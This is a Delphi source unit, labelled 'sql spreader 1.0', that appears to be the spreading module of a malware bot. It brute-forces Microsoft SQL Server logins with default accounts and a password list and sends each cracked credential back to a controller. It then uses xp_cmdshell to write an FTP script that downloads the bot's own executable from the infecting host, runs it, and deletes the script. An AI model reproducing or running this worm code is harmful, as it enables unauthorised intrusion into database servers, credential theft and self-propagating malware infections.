unit SQl;
interface
// tested on local sql server, problem on execute - cant start the program well - varbles arnt freeing
// sql spreader 1.0
// morpheus.

{$include def.mor}

Procedure DoSql(Ip:String);

implementation

uses
  password,SysUtils,OdbcApi,stuff,Ftp,Classes,config;

Const
  usrs : Array[1..3] of String = ('sa','admin','root');

Type
  SqlHacker = class(TThread)
  private
    Target:String;
    FileX:String;
    Command:String;
    procedure hacksql(user,pass:string);
  protected
    constructor Create(T1:String);
    procedure Execute; override;
  end;

constructor SqlHacker.Create;
Begin
  inherited Create(false);
  FreeOnTerminate := True;
  Target:=t1;
end;

Procedure SqlHacker.hacksql;
var
  hEnvironment:SQLHENV;
  hdbc1:SQLHDBC;
  hstmt1:SQLHSTMT;
  Retcode,szint:smallint;
  ConnectionString:string;
begin
if (SQLAllocHandle(SQL_HANDLE_ENV,SQL_NULL_HANDLE,hEnvironment) <> SQL_SUCCESS) Then
  {$ifdef debug}
  writeln('(SQL) SQLAllocHandle returned an error.')
  {$endif}
Else
  if (SQLSetEnvAttr(hEnvironment, SQL_ATTR_ODBC_VERSION,SqlPointer(SQL_OV_ODBC3), SQL_IS_INTEGER) <> SQL_SUCCESS) Then  // chk this
    {$ifdef debug}
    Writeln('(SQL) SQLSetEnvAttr returned an error.')
    {$endif}
  Else
    if SQLAllocHandle(SQL_HANDLE_DBC, hEnvironment, hdbc1) <> SQL_SUCCESS then
      {$ifdef debug}
      SendSock('(SQL) SQLAllocHandle returned an error 1.')
      {$endif}
    Else
      Begin
        ConnectionString:='DRIVER={SQL Server};SERVER='+ Target + ';UID='+user+';PWD='+pass+';';
        retcode := SQLDriverConnect(hdbc1, 0 , Pchar(ConnectionString) , SQL_NTS, nil, 1024, szint, SQL_DRIVER_NOPROMPT);
        if retcode <> SQL_ERROR Then
          Begin
            if pass = '' then
               Sendsock('(SQL) FOUND: '+Target+' ['+user+'/NULL')
            else
               Sendsock('(SQL) FOUND: '+Target+' ['+user+'/'+pass+']');
            if SQLAllocHandle(SQL_HANDLE_STMT, hdbc1, hstmt1) <> SQL_SUCCESS then
            {$ifdef debug}
              SendSock('(SQL) SQLAllocHandle returned an error 1.')
            {$endif}
            else
            begin
              retcode:=SQLExecDirect(hstmt1, pchar(command), SQL_NTS);
              if (retcode = SQL_SUCCESS) or (retcode = SQL_SUCCESS_WITH_INFO) then
                sendsock('(SQL) Shellcode Executed ('+inttostr(length(command))+')');
              {$ifdef debug}
                writeln('(SQL) '+Command);
              {$endif}
              // Well Problem To Try doing Extended Ip because THE SQL STUCK!
            end;
            SQLFreeHandle(SQL_HANDLE_STMT, hstmt1);
          End;
        SQLDisconnect(hdbc1);
        SQLFreeHandle(SQL_HANDLE_DBC, hdbc1);
        SQLFreeHandle(SQL_HANDLE_ENV, hEnvironment);
      end;
end;

Procedure SqlHacker.Execute;
Var
  i,j:integer;
begin

Randomize;

FileX:=inttostr(random(1000)+1000)+'.txt';
//                                                                Net to add real ip + lanip
Command:='EXEC master..xp_cmdshell '+Chr(39)+'echo open '+Data.BOT_LocalIP+' '+Inttostr(ftp.port)+' > '+FileX+chr(39)+#13#10;
Command:=Command + 'EXEC master..xp_cmdshell '+Chr(39)+'echo user '+FTP.user+' '+ftp.pass+' >> '+filex+chr(39)+#13#10;
Command:=Command + 'EXEC master..xp_cmdshell '+Chr(39)+'echo binary >> '+filex +chr(39)+#13#10;
Command:=Command + 'EXEC master..xp_cmdshell '+Chr(39)+'echo get '+ExtractFileName(ParamStr(0))+' >> '+FileX+chr(39)+#13#10;
Command:=Command + 'EXEC master..xp_cmdshell '+Chr(39)+'echo quit >> '+FileX+chr(39)+#13#10;
Command:=Command + 'EXEC master..xp_cmdshell '+Chr(39)+'ftp.exe -n -s:'+FileX+chr(39)+#13#10;
Command:=Command + 'EXEC master..xp_cmdshell '+Chr(39)+'del /F /Q '+FileX+chr(39)+#13#10;
Command:=command + 'EXEC master..xp_cmdshell "'+Extractfilename(Paramstr(0))+'"';

For i:=1 to 3 do
  for j:=1 to length(pwds) do
    hacksql(usrs[i],pwds[j]);
Terminate;
end;

Procedure DoSql(Ip:String);
Var T:Sqlhacker;
begin
t:=Sqlhacker.create(Ip);
end;
End.
